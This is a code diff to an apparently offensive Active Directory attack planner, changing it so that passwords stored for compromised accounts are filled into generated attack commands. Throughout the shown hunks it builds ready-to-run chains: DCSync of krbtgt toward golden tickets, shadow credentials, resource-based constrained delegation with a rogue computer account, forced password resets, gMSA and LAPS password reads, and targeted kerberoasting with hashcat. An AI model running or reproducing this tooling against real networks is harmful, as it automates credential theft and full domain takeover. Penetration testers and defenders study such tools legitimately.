@@ -822,6 +822,18 @@ def run(report, store, ui=None):
             # iter-52: substitute learned DC IP so command paste hits a real
             # target. Falls back to '<DC>' placeholder when unknown.
             _dc_e = store.dc_ip() or "<DC>"
+            # iter-59: look up the actor's password so commands like
+            # 'certipy-ad shadow auto -u HELPDESK -p {_owned_pw}' become
+            # 'certipy-ad shadow auto -u HELPDESK -p ThePassword'. Falls
+            # back to '{_owned_pw}' when the resolved principal isn't in
+            # e.creds (e.g. principal name doesn't match a stored cred).
+            _owned_pw = "{_owned_pw}"
+            if _pname:
+                _pname_lc = _pname.lower()
+                for (_ulc, _pw), _ in e.creds.items():
+                    if _ulc == _pname_lc:
+                        _owned_pw = _pw
+                        break
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -846,7 +858,7 @@ def run(report, store, ui=None):
                         (f"# principal (SID {_psid})" if not _pname else
                          f"# principal resolved -> '{_pname}'"),
                         f"impacket-secretsdump -just-dc-user krbtgt "
-                        f"'{_dom_ds}/{_owned}:<password>'@{_dc_ds}",
+                        f"'{_dom_ds}/{_owned}:{_owned_pw}'@{_dc_ds}",
                         f"# with krbtgt hash, next: R-GOLDEN chain",
                     ], src=edge["src"], line=edge["line"]))
                 continue
@@ -857,7 +869,7 @@ def run(report, store, ui=None):
                     crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                     commands=[
                         f"certipy-ad shadow auto -u '{_owned}@<dom>' "
-                        f"-p '<password>' -account '{tgt}' -dc-ip {_dc_e}",
+                        f"-p '{_owned_pw}' -account '{tgt}' -dc-ip {_dc_e}",
                         f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                     ], src=edge["src"], line=edge["line"]))
             elif r in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"):
@@ -879,10 +891,10 @@ def run(report, store, ui=None):
                         commands=[
                             f"impacket-addcomputer -computer-name 'attacker$' "
                             f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e} "
-                            f"'{_dom_e}/{_owned}:<password>'",
+                            f"'{_dom_e}/{_owned}:{_owned_pw}'",
                             f"impacket-rbcd -delegate-from 'attacker$' "
                             f"-delegate-to '{host_short}$' -action write "
-                            f"'{_dom_e}/{_owned}:<password>'",
+                            f"'{_dom_e}/{_owned}:{_owned_pw}'",
                             f"impacket-getST -spn 'cifs/{fqdn}' "
                             f"-impersonate administrator '{_dom_e}/attacker$:P@ssw0rd!'",
                             f"export KRB5CCNAME=administrator.ccache; "
@@ -894,7 +906,7 @@ def run(report, store, ui=None):
                         crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                         commands=[
                             f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                            f"-U '{_dom_e}/{_owned}%<password>' -S {_dc_e}",
+                            f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                             f"netexec smb {_dc_e} -u '{tgt}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
@@ -903,23 +915,23 @@ def run(report, store, ui=None):
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '{_dom_e}/{_owned}%<password>' -S {_dc_e}",
+                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
                 chains.append(Chain("R-GMSA-READ", "read gMSA password",
                     f"ReadGMSAPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap {_dc_e} -u '{_owned}' -p '<password>' --gmsa",
+                        f"netexec ldap {_dc_e} -u '{_owned}' -p '{_owned_pw}' --gmsa",
                         f"# or: impacket-gMSADumper -u '{_owned}' "
-                        f"-p '<password>' -d '{_dom_e}' -l {_dc_e}",
+                        f"-p '{_owned_pw}' -d '{_dom_e}' -l {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadLAPSPassword":
                 chains.append(Chain("R-LAPS-READ", "read LAPS password",
                     f"ReadLAPSPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap {_dc_e} -u '{_owned}' -p '<password>' "
+                        f"netexec ldap {_dc_e} -u '{_owned}' -p '{_owned_pw}' "
                         f"--laps  # filter to {tgt}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddMember":
@@ -928,7 +940,7 @@ def run(report, store, ui=None):
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
                         f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
-                        f"-U '{_dom_e}/{_owned}%<password>' -S {_dc_e}",
+                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddAllowedToAct":
                 # iter-51: AddAllowedToAct = write msDS-AllowedToAct-
@@ -944,10 +956,10 @@ def run(report, store, ui=None):
                     commands=[
                         f"impacket-addcomputer -computer-name 'attacker$' "
                         f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e} "
-                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
                         f"impacket-rbcd -delegate-from 'attacker$' "
                         f"-delegate-to '{host_short}$' -action write "
-                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
                         f"impacket-getST -spn 'cifs/{fqdn}' "
                         f"-impersonate administrator "
                         f"'{_dom_e}/attacker$:P@ssw0rd!'",
@@ -962,10 +974,10 @@ def run(report, store, ui=None):
                     f"(set SPN + UAC -> kerberoast)",
                     crit=7, conf=0.75, ready=1.3, prox=0.85,       # score 5.80
                     commands=[
-                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '<password>' "
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '{_owned_pw}' "
                         f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                         f"impacket-GetUserSPNs -request-user '{tgt}' -dc-ip {_dc_e} "
-                        f"'{_dom_e}/{_owned}:<password>' | tee tgs.txt",
+                        f"'{_dom_e}/{_owned}:{_owned_pw}' | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddSelf":
@@ -976,7 +988,7 @@ def run(report, store, ui=None):
                     crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
                     commands=[
                         f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
-                        f"-U '{_dom_e}/{_owned}%<password>' -S {_dc_e}",
+                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "Owns":
                 # iter-51: Owns = target's owner. Grant self WriteDacl, then
@@ -989,10 +1001,10 @@ def run(report, store, ui=None):
                         f"# grant self WriteDacl via ownership",
                         f"impacket-owneredit -action write -new-owner "
                         f"'{_owned}' -target '{tgt}' "
-                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
                         f"impacket-dacledit -action write -rights FullControl "
                         f"-principal '{_owned}' -target '{tgt}' "
-                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
                         f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AllExtendedRights":
@@ -1004,7 +1016,7 @@ def run(report, store, ui=None):
                     crit=7, conf=0.8, ready=1.4, prox=0.85,       # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '{_dom_e}/{_owned}%<password>' -S {_dc_e}",
+                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
                 # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
@@ -1016,10 +1028,10 @@ def run(report, store, ui=None):
                     f"(set fake SPN -> kerberoast -> crack {tgt})",
                     crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
                     commands=[
-                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '<password>' "
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '{_owned_pw}' "
                         f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                         f"impacket-GetUserSPNs -request-user '{tgt}' "
-                        f"-dc-ip {_dc_e} '{_dom_e}/{_owned}:<password>' | tee tgs.txt",
+                        f"-dc-ip {_dc_e} '{_dom_e}/{_owned}:{_owned_pw}' | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                         "# then PtH the recovered NT hash (see R7)",
                     ], src=edge["src"], line=edge["line"]))
